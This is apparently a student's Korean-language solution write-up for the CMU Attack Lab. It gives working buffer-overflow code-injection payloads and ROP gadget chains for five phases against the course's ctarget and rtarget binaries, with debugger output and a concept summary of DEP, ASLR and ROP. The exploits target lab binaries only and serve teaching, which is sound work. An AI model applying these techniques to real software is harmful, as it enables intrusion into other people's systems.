# target-lab-review

## Phase 1

### 목표

Make CTARGET to execute the code for touch1 when getbuf executes its return statement.

```text
void test()
{
    int val;
    val = getbuf();
    printf("No exploit.  Getbuf returned 0x%x\n", val);
}

void touch1()
{
    vlevel = 1;        /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}

(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp // buf size == 40
   0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
End of assembler dump.

(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   ...
```

### 풀이

낮은 주소
┌─────────────────┐
│ buf[0]          │ ← %rsp
│ ...             │
│ buf[39]         │
├─────────────────┤
│ return address  │ ← touch1()으로 덮어써야 함.
└─────────────────┘
높은 주소

ctarget-p1.txt

```text
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40
```

./hex2raw < ctarget-p1.txt | ./ctarget -q
=> ctarget.p1.txt에 작성된 hexadecimal 문자열을 hex2raw에 입력해서 raw byte 데이터로 변환한 뒤, 그 결과를 ctarget의 입력으로 전달하여 실행한다.

### 결과

./hex2raw < ctarget-p1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40


## Phase 2

### 목표

Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument.

```text
void touch2(unsigned val)
{
    vlevel = 2;
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}

(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:     sub    $0x8,%rsp
   0x00000000004017f0 <+4>:     mov    %edi,%edx
   ...
End of assembler dump.
```

### 풀이

낮은 주소
┌─────────────────┐
│ buf[0]          │ ← touch2 첫 번째 인자 레지스터(%rdi) 주어진 쿠키로 변경
│ ...             │ ← touch2 함수의 시작 주소를 스택에 push
│ buf[39]         │ ← 위 주소로 ret
├─────────────────┤
│ return address  │ ← (1) buf[0]으로 이동
└─────────────────┘
높은 주소

* modandjump.s
movq $0x59b997fa, %rdi
pushq $0x4017ec
ret

* gcc -c modandjump.s로 modandjump.o 생성

* objdump -d modandjump.o
0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret

* buf[0]의 주소 찾기
(gdb) file ./ctarget
(gdb) b *0x4017af // getbuf 함수의 sub $0x28,%rsp; mov %rsp,%rdi 직후 주소에 중단점 설정
(gdb) r -q // 실행
(gdb) print /x $rsp
$1 = 0x5561dc78 // buf[0]의 주소

* ctarget-p2.txt
48 c7 c7 fa 97 b9 59 68
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55

### 결과

./hex2raw < ctarget-p2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55


## Phase 3

### 목표

* cookie를 0x 제외한 8자리 16진수 문자열로 exploit 안에 넣기
* `%rdi`에는 cookie 값이 아니라 **그 문자열의 주소**를 넣기
* `hexmatch`, `strncmp`가 스택을 덮어쓸 수 있으므로 **cookie 문자열 위치를 안전한 곳에 배치**해야 함

```text

/* Compare string to hex representation of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3;            /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}

```

### 풀이

* cookie를 0x 제외한 8자리 16진수 문자열로 변환

```text
`echo -n "59b997fa" | xxd -p | sed 's/../& /g' | sed 's/$/00/' > cktostr.txt`
```

* `-n`: 출력 끝에 개행 문자 `\n`을 추가하지 않음
* `xxd`: 입력 데이터를 16진수(hex) 형태로 변환
* `-p`: 주소나 ASCII 표시 없이 순수한 16진수 값만 출력
* `sed`: 문자열을 검색·치환하는 명령어
* `s/찾을문자열/바꿀문자열/`: `sed`의 치환(substitute) 문법
* `..`: 정규표현식에서 임의의 문자 2개 → hex 2자리씩 매칭
* `&`: 현재 매칭된 문자열 전체를 의미
* `& `: 매칭된 2글자는 그대로 두고 뒤에 공백 추가
* `g`: 한 번만 치환하지 않고 해당 줄의 모든 매칭에 적용(global)
* `sed 's/../& /g'`: hex 문자열을 2자리씩 끊어서 공백 추가
* `$`: 정규표현식에서 줄의 끝을 의미
* `sed 's/$/00/'`: 줄 끝에 `00`을 추가
* `00`: C 문자열 끝을 나타내는 NULL 문자 `\0`의 ASCII/byte 값
* `>`: 명령의 출력 결과를 파일에 저장. 기존 파일이 있으면 덮어씀 (`>>`는 기존 파일 뒤에 추가)
* `cktostr.txt`: 최종 결과를 저장할 파일 이름

* cktostr.txt 
35 39 62 39 39 37 66 61 00

* buf[0] 주소 == 0x5561dc78 

* buf[48] 주소 == 0x5561dc78 + 0x30 = 0x5561dca8

* objdump -d p3modandjump.o
0000000000000000 <.text>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          push   $0x4018fa // ❌ push 0x4018fa == push ($0x4018fa)
   c:   c3 

* ctarget-p3.txt
48 c7 c7 a8 dc 61 55 68 
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 // 0 8개 필수
35 39 62 39 39 37 66 61 // 문자열은 그대로 (리틀 엔디안 ❌)
00                      // '\0'

### 정답

./hex2raw < ctarget-p3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00


## Phase 4

### 설명

목표: Phase 2와 같은 공격을 rtarget에서 수행
방법: 직접 코드를 주입하지 않고 ROP gadget 사용
허용 명령어: movq, popq, ret, nop
사용 가능 레지스터: %rax ~ %rdi
gadget 위치: start_farm ~ mid_farm
필요한 gadget 수: 2개
popq를 쓰면 스택의 값을 레지스터로 가져오므로 exploit에는 gadget 주소와 데이터 값이 함께 들어감

### 풀이

00000000004019ca <getval_280>:
  4019ca:       b8 29 58 90 c3 
  // 58: pop %rax 90: nop c3: retq
  // 0x4019cc로 가면 pop %rax; retq가 실행된다.

* popq %rax = movq (%rsp), %rax; addq $8, %rsp

00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3 
  // 48 89 c7: movq %rax, %rdi; c3: retq;

* rtarget-p4.txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

cc 19 40 00 00 00 00 00 # popq %rax; retq; => movq (%rsp), %rax 행동. 이때의 %rsp가 아래에 있는 쿠키
fa 97 b9 59 00 00 00 00 # cookie
a2 19 40 00 00 00 00 00 # movq %rax, %rdi
ec 17 40 00 00 00 00 00 # touch2()

=> 제출 시 주석은 제거해야 됨.

### 결과

./hex2raw < rtarget-p4.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00


## Phase 5

### 설명

목표: Phase 2와 같은 공격을 rtarget에서 수행
방법: 직접 코드를 주입하지 않고 ROP gadget 사용

### 풀이


0000000000401aab <setval_350>:
  401aab:       c7 07 48 89 e0 90       
  401ab1:       c3
  // 89 e0 90 c3 = movl %esp, %eax; nop; retq

00000000004019a0 <addval_273>:
  4019a0:       8d 87 48 89 c7 c3
  // 48 89 c7 c3 = movq %rax, %rdi ； retq

cc 19 40 00 00 00 00 00 # popq %rax; retq; (Phase 4)

offset: 48 00 00 00 00 00 00 00 (rsp 값을 넣은 지점과 string 위치가 48 bytes 차이)

00000000004019db <getval_481>:
  4019db:       b8 5c 89 c2 90          
  4019e0:       c3
  // 89 c2 90 c3: movl %eax, %edx; nop; ret

0000000000401a33 <getval_159>:
  401a33:       b8 89 d1 38 c9          
  401a38:       c3
  // 89 d1: movl %edx, %ecx
  // 38 c9: cmpb %cl, %cl는 영향 없음

0000000000401a11 <addval_436>:
  401a11:       8d 87 89 ce 90 90 
  401a17:       c3 
  // 89 ce: movl %ecx, %esi

00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       
  4019c9:       c3
  // 89 c7: movq %rax, %rdi


00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ae 1a 40 00 00 00 00 00 # movq %rsp, %rax
a2 19 40 00 00 00 00 00 # movq %rax, %rdi
cc 19 40 00 00 00 00 00 # popq %rax
48 00 00 00 00 00 00 00 # %rax에 pop되는 값
dd 19 40 00 00 00 00 00 # movl %eax, %edx	
34 1a 40 00 00 00 00 00 # movl %edx, %ecx	
13 1a 40 00 00 00 00 00 # movl %ecx, %esi
d6 19 40 00 00 00 00 00 # <add_xy>
c5 19 40 00 00 00 00 00 # movq %rax, %rdi
fa 18 40 00 00 00 00 00 # <touch3>
35 39 62 39 39 37 66 61 # string cookie
00 00 00 00 00 00 00 00 # '\0' + padding

### 결과

./hex2raw < rtarget-p5.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AD 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00


## Target Lab 핵심 정리

Target Lab은 시스템 보안의 기초인 **버퍼 오버플로우(Buffer Overflow)** 취약점을 이해하고, 이를 방어하기 위한 현대적인 **보안 기법(DEP, ASLR)**과 이를 다시 우회하는 **고급 공격 기법(ROP)**을 학습하는 과제입니다.

### 1. 버퍼 오버플로우 (Buffer Overflow)
* **개념**
  * 프로그램이 입력값을 받을 때, 할당된 메모리 공간(버퍼)의 크기보다 더 큰 데이터를 입력하여 인접한 메모리 영역을 오염시키는 취약점입니다.
* **실습 적용**
  * 과제에서 제공되는 `getbuf()` 함수는 입력 크기를 검사하지 않는 취약한 함수(`Gets`)를 사용합니다. 
  * 이를 이용해 스택에 할당된 배열을 넘치게 채우고, 함수의 **리턴 주소(Return Address)**가 저장된 영역까지 원하는 주소로 덮어씌워 프로그램의 실행 흐름을 강제로 바꿉니다. *(Phase 1 ~ 5 공통)*

### 2. 코드 인젝션 (Code Injection)
* **개념**
  * 스택 메모리에 공격자가 실행하고자 하는 악성 기계어 코드(**쉘코드, Shellcode**)를 직접 주입한 뒤, 리턴 주소를 해당 스택 주소로 돌려 코드를 실행하는 기법입니다.
* **실습 적용**
  * **Phase 1, 2, 3**의 핵심 해결 방식입니다. 
  * 쿠키 값을 레지스터에 넣는 어셈블리 코드를 기계어로 변환하여 스택 버퍼에 삽입하고, 리턴 주소를 스택 주소로 변조하여 레지스터를 조작한 후 `touch2`, `touch3`를 호출합니다.

### 3. 스택 가드 (DEP / NX bit)
* **개념**
  * "스택 영역에는 데이터만 쌓고, 코드는 실행하지 못하게 하자"는 **데이터 실행 방지(DEP, Data Execution Prevention)** 보안 기법입니다. 
  * 스택에 주입된 코드가 실행되려고 하면 `Segmentation fault`를 발생시켜 공격을 차단합니다.
* **실습 적용**
  * **Phase 4, 5**의 배경이 되는 보안 기법입니다. 
  * 이 기법이 적용된 `rtarget` 바이너리에서는 더 이상 스택에 코드를 적어서 실행하는 '코드 인젝션' 기법을 사용할 수 없게 됩니다.

### 4. ROP (Return-Oriented Programming)
* **개념**
  * 스택에 코드를 주입할 수 없을 때(NX bit 활성화), 바이너리의 기존 코드 영역(Text Area)에 이미 존재하는 코드 조각들을 조각조각 이어 붙여서 공격 코드를 구성하는 기법입니다.
* **실습 적용**
  * **Phase 4, 5**의 핵심 해결 방식입니다. 
  * `farm.c` 또는 바이너리 내부에서 `pop`, `mov` 등의 명령어로 시작해 최종적으로 `ret` (`0xc3`)로 마치는 코드 조각(**가젯, Gadget**)들의 주소를 스택에 체인처럼 엮어서 레지스터를 제어합니다.

### 5. ASLR (Address Space Layout Randomization)
* **개념**
  * 프로그램이 실행될 때마다 스택, 힙, 라이브러리 등의 메모리 시작 주소를 매번 무작위로 변경하는 보안 기법입니다. 
  * 공격자가 특정 스택 주소를 하드코딩하여 공격하는 것을 방어합니다.
* **실습 적용**
  * 최종 관문인 **Phase 5**의 핵심 난제입니다. 스택 주소가 계속 바뀌므로 고정 주소를 사용할 수 없습니다. 
  * 따라서 가젯이 실행되는 시점의 현재 스택 주소(`%rsp`)를 읽어온 뒤, 미리 계산해 둔 거리(**오프셋, Offset**)를 동적으로 더하는 연산(`add_xy`)을 수행하여 변하는 스택 속에서도 원하는 데이터(쿠키 문자열)의 위치를 정확하게 찾아갑니다.